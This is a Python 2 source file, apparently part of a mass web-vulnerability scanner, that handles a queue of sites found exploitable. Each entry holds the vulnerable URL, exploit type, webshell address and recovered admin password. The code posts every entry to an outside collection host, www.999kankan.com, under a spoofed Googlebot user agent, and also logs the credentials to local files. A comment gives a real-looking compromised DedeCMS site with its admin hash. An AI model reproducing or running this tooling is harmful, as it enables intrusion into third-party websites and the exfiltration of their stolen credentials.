#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#神龙 QQ29295842
#blog http://hi.baidu.com/alalmn
#线程操作消息队列
import threading
import Queue
import time
import urllib2

webscan_url = Queue.Queue(0) #要采集的URL    #当有多个线程共享一个东西的时候就可以用它了
exp_url = Queue.Queue() #存在EXP漏洞的  ["网址","漏洞类型","漏洞详细信息","漏洞地址","密码","备注"]
exp_url_int = Queue.Queue(0)    #多线程下变量共享  不知道怎么回事
class C_Queue(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.exp_url_int=0
    def print_Queue(self):
        try:
            print "-----------------------------------------"
            print "webscan_url--------%s"%(webscan_url.qsize())
            print "exp_url------------%s"%(exp_url_int.qsize())
            print "-----------------------------------------"
        except Exception,e:
            #print e
            return 0

    def run(self):
        while True:
            try:
                self.print_Queue()
                self.add_txt_exp_url()  #对exp_url进行存储
                time.sleep(10)
            except Exception,e:
                pass

    def TXT_file(self,file_nem,data):  #写入文本
        try:
            #file_nem=time.strftime('%Y.%m.%d')   #file_nem+".txt"
            file_object = open(file_nem,'a')
            #file_object.write(list_passwed[E])
            file_object.writelines(data)
            file_object.writelines("\n")
            file_object.close()
        except Exception,e:
            #print e
            return 0

    def url_post(self,URL):
        try:
            req = urllib2.Request(URL)
            req.add_header('User-Agent',"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)")
            urllib2.urlopen(req,timeout=20)  # 超时10秒   #s = urllib2.urlopen(r"http://www.163.com")
            #urllib2.urlopen(URL,timeout=20)  # 后门POST提交   超时10秒   #s = urllib2.urlopen(r"http://www.163.com")
            #time.sleep(1)
            return 1
        except:
            return 0

    def add_txt_exp_url(self):
        try:
            if exp_url.empty():   #判断队列是否为空
                time.sleep(20)
                return 0
            int_exp=int(exp_url.qsize())
            for i in range(int(int_exp)):
                self.Chost = exp_url.get(0.5)  #get()方法从队头删除并返回一个项目
                #["网址","漏洞类型","漏洞详细信息","漏洞地址","密码","备注"]
                #['http://www.zbwjcyj.com', 'bc', 'bc_dedecms_search_php2', 'http://www.zbwjcyj.com/plus/search.php', '1|admin|ad8cfe565bfe31f810de', '']
                url="http://www.999kankan.com/URL_EXP.php?yijuhua=%s&url=%s&exp=%s&expR=%s&webshell=%s&password=%s&bz=%s"\
                    %("1",str(self.Chost[0]),str(self.Chost[1]),str(self.Chost[2]),str(self.Chost[3]),str(self.Chost[4]),str(self.Chost[5]))
                #print url
                self.url_post(url)
                self.TXT_file(str(self.Chost[2])+".txt",str(self.Chost[3])+"|"+str(self.Chost[4]))  #写入文本
                #self.exp_url_int+=1
                exp_url_int.put(str(self.Chost[1]),0.3)   #插入队列
        except Exception,e:
            #print e
            return 0

################################################
if __name__=='__main__':
    threads = []  #线程
    for i in range(1):  #nthreads=10  创建10个线程
        threads.append(C_Queue())
    for t in threads:   #不理解这是什么意思    是结束线程吗
        t.start()  #start就是开始线程